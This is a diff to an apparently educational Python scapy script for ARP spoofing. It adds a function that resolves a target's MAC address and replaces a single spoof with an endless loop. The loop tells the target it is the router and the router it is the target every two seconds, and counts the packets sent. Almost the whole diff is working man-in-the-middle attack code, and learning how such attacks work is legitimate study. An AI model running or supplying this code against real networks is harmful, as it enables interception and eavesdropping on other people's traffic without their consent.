@@ -39,6 +39,19 @@ packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
 # Send our scapy ARP packet to the target IP address.
 # scapy.send(packet)
 
+# get the Target IP MAC Address
+def get_mac(ip):
+	arp_request = ARP(pdst=ip)
+	broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+	broadcast_arp_request = broadcast/arp_request
+	answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
+	# Check if any responses were received
+	# fix, IndexError: list index out of range
+	if len(answered_list) > 0:
+		return answered_list[0][1].hwsrc
+	else:
+		return None
+
 # So, previously we fooled the target into thinking we are the router.
 # But we also need to fool the router into thinking we are the target
 # We can build a function to do this:
@@ -46,10 +59,22 @@ packet = ARP(op=2, pdst=target_interface_1, hwdst=target_mac_1, psrc=router_ip)
 def spoof(target_ip, spoof_ip):
 	target_mac = get_mac(target_ip)
 	packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-	scapy.send(packet)
+	# verbose = False, stop scapy telling us a packet has been sent
+	scapy.send(packet, verbose=False)
 
-# Tell the Target Computer we are the Router
-spoof(target_interface_1, router_ip)
-# Tell the Router we are the Target Computer
-spoof(router_ip, target_interface_1)
+# create variable to increment value
+sent_packets_count = 0
+# while something is true, which in this case is always, do what follows
+while True:
+	# Tell the Target Computer we are the Router
+	spoof(target_interface_1, router_ip)
+	# Tell the Router we are the Target Computer
+	spoof(router_ip, target_interface_1)
+	sent_packets_count = sent_packets_count + 2
+	# Comma at end tells us to print without the newline char
+	# \r, print statement from the start of the line
+	print("\r[+] Packets sent: " + str(sent_packets_count)),
+	# flush buffer, print output as loop runs, don't wait til program quits.
+	sys.stdout.flush()
+	time.sleep(2)
 
